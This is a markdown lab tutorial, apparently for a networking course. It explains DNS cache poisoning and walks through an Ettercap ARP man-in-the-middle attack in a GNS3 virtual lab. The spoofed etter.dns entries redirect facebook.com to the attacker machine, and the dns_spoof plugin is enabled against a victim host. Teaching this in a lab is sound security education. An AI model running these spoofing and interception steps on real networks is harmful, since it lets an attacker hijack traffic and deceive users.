# DNS SPOOFING

**DNS Spoofing**, also referred to as **DNS cache poisoning**, is a form of computer security hacking in which corrupt Domain Name System data is introduced into the DNS resolver's cache, causing the name server to return an incorrect result record, e.g. an IP address. This results in traffic being diverted to the attacker's computer (or any other computer).

## DNS Spoofing example with **Ettercap**

### Settings:
 * **Attacker:** debian machine
 * **Victim:** ubuntu-1 host machine
 * **Router:** cisco-7200 image (R1 machine)
 * **Switch:** cisco-3745 image (SW1 machine)
 * **Other actors:** ubuntu-2 host machine

### Steps:
* Run the GNS3 lab
* Connect to the **attacker machine**
* Install **ettercap**

        sudo apt update
        sudo apt install ettercap-text-only
* Edit the file `/etc/ettercap/etter.dns`

        sudo pico /etc/ettercap/etter.dns
* Add lines in order to declare yourself as DNS server

        <Website> <DNS_Query_Type> <Attacker_IP_Address>
* E.g., add the following lines at the end of the file

        facebook.com        A       10.0.0.2
        *.facebook.com      A       10.0.0.2
        www.facebook.com    PTR     10.0.0.2
* Note that, in our example we setup the following parameters
  * `Website:` is **facebook.com** OR ***.facebook.com** OR **www.facebook.com**
  * `DNS_Query_Type`: is **A** OR **PTR**
    * `A:` is the Address Mapping record **(A Record)** - also known as a **DNS host record**. It stores a hostname and its corresponding IPv4 address
    * `PTR:` is a DNS **P**oin**T**er **R**ecord (PTR). It provides the domain name associated with an IP address. A DNS PTR record is exactly the opposite of the **A** record, which provides the IP address associated with a domain name. **DNS PTR records are used in reverse DNS lookups** 
  * `Attacker_IP_Address:` is **10.0.0.2**
* Execute `ettercap` command in order to scan all the network 
  * `-T:` **select the text only GUI**

        sudo ettercap -T
  * Press `spacebar` to enable/disable packets view
  * Press `l` (lowercase `L`) to show information about discovered devices in the network
* Choose the IP and MAC address of the machine you want to attack (we will choose the ip addres of the **ubuntu-1 host** for simplicity)
* Stop `ettercap` pressing `q` 
* Run (again) `ettercap` in order to start with the **MITM** attack based on ARP
  * `-M:` perform a mitm attack. Requires an additional argument useful to specify the **attack type**
  * `<ATTACK_TYPE>:` **ARP**, DHCP, ICMP, etc (see `man ettercap`) 
  * `<VICTIM_TARGET>:` is in the form `MAC/IPs/IPv6/PORTs`. If you want you can omit any of its parts and this will represent an ANY in that part, e.g.,
    
    `/10.0.0.5//` means **ANY mac address**, **ONLY ip 10.0.0.1**, **ANY IPv6** and **ANY port**

        sudo ettercap -T -M <ATTACK_TYPE> <VICTIM_TARGET>
* Press `p` and enter `dns_spoof`
* Connect to the **Victim machine**  and run the following command

        ping facebook.com
* Execute **Wireshark** on the link which connects the **Victim** machine to the **Switch (SW1)**
    * Check if the **Victim** is receiving new **icmp** requests
* Execute **Wireshark** on the link which connects the **Attacker** machine to the **Switch (SW1)**
    * Check if the **Attacker** is receiving new **icmp** requests
